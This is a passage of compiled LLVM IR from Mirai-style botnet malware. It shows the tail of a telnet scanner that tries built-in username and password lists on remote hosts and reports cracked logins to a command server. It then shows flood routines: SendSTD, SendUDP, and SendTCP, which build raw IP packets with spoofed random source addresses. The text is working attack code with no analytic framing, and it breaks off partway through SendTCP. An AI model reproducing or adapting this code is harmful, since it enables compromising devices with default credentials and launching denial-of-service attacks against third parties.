  %756 = sext i32 %755 to i64
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %756
  %758 = call i8* @get_telstate_host(%struct.telstate_t* %757)
  %759 = load i32, i32* %6, align 4
  %760 = sext i32 %759 to i64
  %761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %760
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %761, i32 0, i32 4
  %763 = load i8, i8* %762, align 2
  %764 = zext i8 %763 to i64
  %765 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %764
  %766 = load i8*, i8** %765, align 8
  %767 = load i32, i32* %6, align 4
  %768 = sext i32 %767 to i64
  %769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %768
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %769, i32 0, i32 5
  %771 = load i8, i8* %770, align 1
  %772 = zext i8 %771 to i64
  %773 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %772
  %774 = load i8*, i8** %773, align 8
  %775 = call i32 (i32, i8*, ...) @sockprintf(i32 %754, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.509, i32 0, i32 0), i8* %758, i8* %766, i8* %774)
  %776 = load i32, i32* %6, align 4
  %777 = sext i32 %776 to i64
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %777
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %778, i32 0, i32 0
  %780 = load i32, i32* %779, align 16
  %781 = load i32, i32* %3, align 4
  %782 = load i32, i32* %6, align 4
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %783
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %784, i32 0, i32 9
  %786 = load i8*, i8** %785, align 8
  %787 = call i32 @read_until_response(i32 %780, i32 %781, i8* %786, i32 1024, i8** bitcast ([10 x i8]* @.str.513 to i8**))
  %788 = icmp ne i32 %787, 0
  br i1 %788, label %789, label %829

; <label>:789:                                    ; preds = %753
  %790 = load i32, i32* %6, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %791
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %792, i32 0, i32 9
  %794 = load i8*, i8** %793, align 8
  %795 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %794, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.510, i32 0, i32 0))
  %796 = icmp ne i32 %795, 0
  br i1 %796, label %797, label %828

; <label>:797:                                    ; preds = %789
  %798 = load i32, i32* %6, align 4
  %799 = sext i32 %798 to i64
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %799
  %801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %800, i32 0, i32 3
  %802 = load i8, i8* %801, align 1
  %803 = zext i8 %802 to i32
  %804 = icmp ne i32 %803, 3
  br i1 %804, label %805, label %828

; <label>:805:                                    ; preds = %797
  %806 = load i32, i32* @mainCommSock, align 4
  %807 = load i32, i32* %6, align 4
  %808 = sext i32 %807 to i64
  %809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %808
  %810 = call i8* @get_telstate_host(%struct.telstate_t* %809)
  %811 = load i32, i32* %6, align 4
  %812 = sext i32 %811 to i64
  %813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %812
  %814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %813, i32 0, i32 4
  %815 = load i8, i8* %814, align 2
  %816 = zext i8 %815 to i64
  %817 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %816
  %818 = load i8*, i8** %817, align 8
  %819 = load i32, i32* %6, align 4
  %820 = sext i32 %819 to i64
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %820
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %821, i32 0, i32 5
  %823 = load i8, i8* %822, align 1
  %824 = zext i8 %823 to i64
  %825 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %824
  %826 = load i8*, i8** %825, align 8
  %827 = call i32 (i32, i8*, ...) @sockprintf(i32 %806, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.511, i32 0, i32 0), i8* %810, i8* %818, i8* %826)
  br label %828

; <label>:828:                                    ; preds = %805, %797, %789
  br label %829

; <label>:829:                                    ; preds = %828, %753
  %830 = load i32, i32* %6, align 4
  %831 = sext i32 %830 to i64
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %831
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %832, i32 0, i32 7
  %834 = load i32, i32* %833, align 16
  %835 = add i32 %834, 45
  %836 = zext i32 %835 to i64
  %837 = call i64 @time(i64* null) #5
  %838 = icmp slt i64 %836, %837
  br i1 %838, label %839, label %874

; <label>:839:                                    ; preds = %829
  %840 = load i32, i32* %6, align 4
  %841 = sext i32 %840 to i64
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %841
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %842, i32 0, i32 3
  %844 = load i8, i8* %843, align 1
  %845 = zext i8 %844 to i32
  %846 = icmp ne i32 %845, 3
  br i1 %846, label %847, label %870

; <label>:847:                                    ; preds = %839
  %848 = load i32, i32* @mainCommSock, align 4
  %849 = load i32, i32* %6, align 4
  %850 = sext i32 %849 to i64
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %850
  %852 = call i8* @get_telstate_host(%struct.telstate_t* %851)
  %853 = load i32, i32* %6, align 4
  %854 = sext i32 %853 to i64
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %854
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %855, i32 0, i32 4
  %857 = load i8, i8* %856, align 2
  %858 = zext i8 %857 to i64
  %859 = getelementptr inbounds [34 x i8*], [34 x i8*]* @Mirai_Usernames, i64 0, i64 %858
  %860 = load i8*, i8** %859, align 8
  %861 = load i32, i32* %6, align 4
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %862
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %863, i32 0, i32 5
  %865 = load i8, i8* %864, align 1
  %866 = zext i8 %865 to i64
  %867 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Mirai_Passwords, i64 0, i64 %866
  %868 = load i8*, i8** %867, align 8
  %869 = call i32 (i32, i8*, ...) @sockprintf(i32 %848, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.512, i32 0, i32 0), i8* %852, i8* %860, i8* %868)
  br label %870

; <label>:870:                                    ; preds = %847, %839
  %871 = load i32, i32* %6, align 4
  %872 = sext i32 %871 to i64
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %872
  call void @reset_telstate(%struct.telstate_t* %873)
  br label %874

; <label>:874:                                    ; preds = %870, %829
  br label %875

; <label>:875:                                    ; preds = %874, %688, %631, %528, %486, %431, %389, %337, %232, %90
  br label %876

; <label>:876:                                    ; preds = %875, %749, %684, %645, %616, %524, %512, %471, %427, %415, %374, %318, %314, %197, %166
  %877 = load i32, i32* %6, align 4
  %878 = add nsw i32 %877, 1
  store i32 %878, i32* %6, align 4
  br label %72

; <label>:879:                                    ; preds = %72
  br label %70
                                                  ; No predecessors!
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @SendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [24 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %14, i32* %7, align 4
  %15 = call i64 @time(i64* null) #5
  store i64 %15, i64* %8, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %10, align 8
  %18 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = load %struct.hostent*, %struct.hostent** %10, align 8
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %19, i32 0, i32 4
  %21 = load i8**, i8*** %20, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %25 = bitcast %struct.in_addr* %24 to i8*
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 3
  %28 = load i32, i32* %27, align 4
  %29 = sext i32 %28 to i64
  call void @bcopy(i8* %23, i8* %25, i64 %29) #5
  %30 = load %struct.hostent*, %struct.hostent** %10, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 2
  %32 = load i32, i32* %31, align 8
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %33, i16* %34, align 4
  %35 = load i32, i32* %5, align 4
  %36 = trunc i32 %35 to i16
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 0, i32* %11, align 4
  br label %38

; <label>:38:                                     ; preds = %64, %3
  %39 = bitcast [24 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %39, i8* bitcast ([24 x i8*]* @SendSTD.randstrings to i8*), i64 192, i32 16, i1 false)
  %40 = call i32 @rand() #5
  %41 = sext i32 %40 to i64
  %42 = urem i64 %41, 24
  %43 = getelementptr inbounds [24 x i8*], [24 x i8*]* %12, i64 0, i64 %42
  %44 = load i8*, i8** %43, align 8
  store i8* %44, i8** %13, align 8
  %45 = load i32, i32* %11, align 4
  %46 = icmp uge i32 %45, 50
  br i1 %46, label %47, label %64

; <label>:47:                                     ; preds = %38
  %48 = load i32, i32* %7, align 4
  %49 = load i8*, i8** %13, align 8
  %50 = call i64 @send(i32 %48, i8* %49, i64 69, i32 0)
  %51 = load i32, i32* %7, align 4
  %52 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %51, %struct.sockaddr* %52, i32 16)
  %54 = call i64 @time(i64* null) #5
  %55 = load i64, i64* %8, align 8
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = add nsw i64 %55, %57
  %59 = icmp sge i64 %54, %58
  br i1 %59, label %60, label %63

; <label>:60:                                     ; preds = %47
  %61 = load i32, i32* %7, align 4
  %62 = call i32 @close(i32 %61)
  call void @_exit(i32 0) #11
  unreachable

; <label>:63:                                     ; preds = %47
  store i32 0, i32* %11, align 4
  br label %64

; <label>:64:                                     ; preds = %63, %38
  %65 = load i32, i32* %11, align 4
  %66 = add i32 %65, 1
  store i32 %66, i32* %11, align 4
  br label %38
                                                  ; No predecessors!
  ret void
}

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %6
  %28 = call i32 @rand_cmwc()
  %29 = trunc i32 %28 to i16
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  br label %36

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* %8, align 4
  %33 = trunc i32 %32 to i16
  %34 = call zeroext i16 @htons(i16 zeroext %33) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %36

; <label>:36:                                     ; preds = %31, %27
  %37 = load i8*, i8** %7, align 8
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %39 = call i32 @getHost(i8* %37, %struct.in_addr* %38)
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %36
  br label %206

; <label>:42:                                     ; preds = %36
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = load i32, i32* %11, align 4
  store i32 %45, i32* %14, align 4
  %46 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %46, i32* %15, align 4
  %47 = load i32, i32* %15, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %42
  br label %206

; <label>:50:                                     ; preds = %42
  store i32 1, i32* %16, align 4
  %51 = load i32, i32* %15, align 4
  %52 = bitcast i32* %16 to i8*
  %53 = call i32 @setsockopt(i32 %51, i32 0, i32 3, i8* %52, i32 4) #5
  %54 = icmp slt i32 %53, 0
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %50
  br label %206

; <label>:56:                                     ; preds = %50
  store i32 50, i32* %17, align 4
  br label %57

; <label>:57:                                     ; preds = %61, %56
  %58 = load i32, i32* %17, align 4
  %59 = add nsw i32 %58, -1
  store i32 %59, i32* %17, align 4
  %60 = icmp ne i32 %58, 0
  br i1 %60, label %61, label %68

; <label>:61:                                     ; preds = %57
  %62 = call i64 @time(i64* null) #5
  %63 = call i32 @rand_cmwc()
  %64 = zext i32 %63 to i64
  %65 = xor i64 %62, %64
  %66 = trunc i64 %65 to i32
  call void @srand(i32 %66) #5
  %67 = call i32 @rand() #5
  call void @init_rand(i32 %67)
  br label %57

; <label>:68:                                     ; preds = %57
  %69 = load i32, i32* %12, align 4
  %70 = sub nsw i32 32, %69
  %71 = shl i32 1, %70
  %72 = sub nsw i32 %71, 1
  %73 = xor i32 %72, -1
  store i32 %73, i32* %18, align 4
  %74 = load i32, i32* %10, align 4
  %75 = sext i32 %74 to i64
  %76 = add i64 28, %75
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %19, align 8
  %78 = alloca i8, i64 %76, align 16
  %79 = bitcast i8* %78 to %struct.iphdr*
  store %struct.iphdr* %79, %struct.iphdr** %20, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %81 = bitcast %struct.iphdr* %80 to i8*
  %82 = getelementptr i8, i8* %81, i64 20
  %83 = bitcast i8* %82 to %struct.udphdr*
  store %struct.udphdr* %83, %struct.udphdr** %21, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %86 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %18, align 4
  %89 = call i32 @getRandomIP(i32 %88)
  %90 = call i32 @htonl(i32 %89) #10
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = add i64 8, %92
  %94 = trunc i64 %93 to i32
  call void @makeIPPacket(%struct.iphdr* %84, i32 %87, i32 %90, i8 zeroext 17, i32 %94)
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = add i64 8, %96
  %98 = trunc i64 %97 to i16
  %99 = call zeroext i16 @htons(i16 zeroext %98) #10
  %100 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %101 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %100, i32 0, i32 0
  %102 = bitcast %union.anon.1* %101 to %struct.anon.2*
  %103 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %102, i32 0, i32 2
  store i16 %99, i16* %103, align 2
  %104 = call i32 @rand_cmwc()
  %105 = trunc i32 %104 to i16
  %106 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %107 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon.1* %107 to %struct.anon.2*
  %109 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %108, i32 0, i32 0
  store i16 %105, i16* %109, align 2
  %110 = load i32, i32* %8, align 4
  %111 = icmp eq i32 %110, 0
  br i1 %111, label %112, label %114

; <label>:112:                                    ; preds = %68
  %113 = call i32 @rand_cmwc()
  br label %119

; <label>:114:                                    ; preds = %68
  %115 = load i32, i32* %8, align 4
  %116 = trunc i32 %115 to i16
  %117 = call zeroext i16 @htons(i16 zeroext %116) #10
  %118 = zext i16 %117 to i32
  br label %119

; <label>:119:                                    ; preds = %114, %112
  %120 = phi i32 [ %113, %112 ], [ %118, %114 ]
  %121 = trunc i32 %120 to i16
  %122 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %123 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon.1* %123 to %struct.anon.2*
  %125 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %124, i32 0, i32 1
  store i16 %121, i16* %125, align 2
  %126 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %127 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %126, i32 0, i32 0
  %128 = bitcast %union.anon.1* %127 to %struct.anon.2*
  %129 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %128, i32 0, i32 3
  store i16 0, i16* %129, align 2
  %130 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %131 = bitcast %struct.udphdr* %130 to i8*
  %132 = getelementptr inbounds i8, i8* %131, i64 8
  %133 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %132, i32 %133)
  %134 = bitcast i8* %78 to i16*
  %135 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 2
  %137 = load i16, i16* %136, align 2
  %138 = zext i16 %137 to i32
  %139 = call zeroext i16 @csum(i16* %134, i32 %138)
  %140 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 7
  store i16 %139, i16* %141, align 2
  %142 = call i64 @time(i64* null) #5
  %143 = load i32, i32* %9, align 4
  %144 = sext i32 %143 to i64
  %145 = add nsw i64 %142, %144
  %146 = trunc i64 %145 to i32
  store i32 %146, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %147

; <label>:147:                                    ; preds = %201, %200, %119
  br label %148

; <label>:148:                                    ; preds = %147
  %149 = load i32, i32* %15, align 4
  %150 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %151 = call i64 @sendto(i32 %149, i8* %78, i64 %76, i32 0, %struct.sockaddr* %150, i32 16)
  %152 = call i32 @rand_cmwc()
  %153 = trunc i32 %152 to i16
  %154 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %155 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %154, i32 0, i32 0
  %156 = bitcast %union.anon.1* %155 to %struct.anon.2*
  %157 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %156, i32 0, i32 0
  store i16 %153, i16* %157, align 2
  %158 = load i32, i32* %8, align 4
  %159 = icmp eq i32 %158, 0
  br i1 %159, label %160, label %162

; <label>:160:                                    ; preds = %148
  %161 = call i32 @rand_cmwc()
  br label %167

; <label>:162:                                    ; preds = %148
  %163 = load i32, i32* %8, align 4
  %164 = trunc i32 %163 to i16
  %165 = call zeroext i16 @htons(i16 zeroext %164) #10
  %166 = zext i16 %165 to i32
  br label %167

; <label>:167:                                    ; preds = %162, %160
  %168 = phi i32 [ %161, %160 ], [ %166, %162 ]
  %169 = trunc i32 %168 to i16
  %170 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %171 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %170, i32 0, i32 0
  %172 = bitcast %union.anon.1* %171 to %struct.anon.2*
  %173 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %172, i32 0, i32 1
  store i16 %169, i16* %173, align 2
  %174 = call i32 @rand_cmwc()
  %175 = trunc i32 %174 to i16
  %176 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 3
  store i16 %175, i16* %177, align 4
  %178 = load i32, i32* %18, align 4
  %179 = call i32 @getRandomIP(i32 %178)
  %180 = call i32 @htonl(i32 %179) #10
  %181 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 8
  store i32 %180, i32* %182, align 4
  %183 = bitcast i8* %78 to i16*
  %184 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 2
  %186 = load i16, i16* %185, align 2
  %187 = zext i16 %186 to i32
  %188 = call zeroext i16 @csum(i16* %183, i32 %187)
  %189 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 7
  store i16 %188, i16* %190, align 2
  %191 = load i32, i32* %23, align 4
  %192 = load i32, i32* %14, align 4
  %193 = icmp eq i32 %191, %192
  br i1 %193, label %194, label %201

; <label>:194:                                    ; preds = %167
  %195 = call i64 @time(i64* null) #5
  %196 = load i32, i32* %22, align 4
  %197 = sext i32 %196 to i64
  %198 = icmp sgt i64 %195, %197
  br i1 %198, label %199, label %200

; <label>:199:                                    ; preds = %194
  br label %204

; <label>:200:                                    ; preds = %194
  store i32 0, i32* %23, align 4
  br label %147

; <label>:201:                                    ; preds = %167
  %202 = load i32, i32* %23, align 4
  %203 = add i32 %202, 1
  store i32 %203, i32* %23, align 4
  br label %147

; <label>:204:                                    ; preds = %199
  %205 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %205)
  br label %206

; <label>:206:                                    ; preds = %204, %55, %49, %41
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %335

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %52, label %51

; <label>:51:                                     ; preds = %45
  br label %335

; <label>:52:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %53 = load i32, i32* %17, align 4
  %54 = bitcast i32* %18 to i8*
  %55 = call i32 @setsockopt(i32 %53, i32 0, i32 3, i8* %54, i32 4) #5
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %52
  br label %335

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* %14, align 4
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  store i32 0, i32* %19, align 4
  br label %68

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %14, align 4
  %64 = sub nsw i32 32, %63
  %65 = shl i32 1, %64
  %66 = sub nsw i32 %65, 1
  %67 = xor i32 %66, -1
  store i32 %67, i32* %19, align 4
  br label %68

; <label>:68:                                     ; preds = %62, %61
  %69 = load i32, i32* %12, align 4
  %70 = sext i32 %69 to i64
  %71 = add i64 40, %70
  %72 = call i8* @llvm.stacksave()
  store i8* %72, i8** %20, align 8
  %73 = alloca i8, i64 %71, align 16
  %74 = bitcast i8* %73 to %struct.iphdr*
  store %struct.iphdr* %74, %struct.iphdr** %21, align 8
  %75 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %76 = bitcast %struct.iphdr* %75 to i8*
  %77 = getelementptr i8, i8* %76, i64 20
  %78 = bitcast i8* %77 to %struct.tcphdr*
  store %struct.tcphdr* %78, %struct.tcphdr** %22, align 8
  %79 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %81 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 4
  %83 = load i32, i32* %19, align 4
  %84 = call i32 @getRandomIP(i32 %83)
  %85 = call i32 @htonl(i32 %84) #10
  %86 = load i32, i32* %12, align 4
  %87 = sext i32 %86 to i64
  %88 = add i64 20, %87
  %89 = trunc i64 %88 to i32
  call void @makeIPPacket(%struct.iphdr* %79, i32 %82, i32 %85, i8 zeroext 6, i32 %89)
  %90 = call i32 @rand_cmwc()
  %91 = trunc i32 %90 to i16
  %92 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %93 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %92, i32 0, i32 0
  %94 = bitcast %union.anon* %93 to %struct.anon.0*
  %95 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %94, i32 0, i32 0
  store i16 %91, i16* %95, align 4
  %96 = call i32 @rand_cmwc()
  %97 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
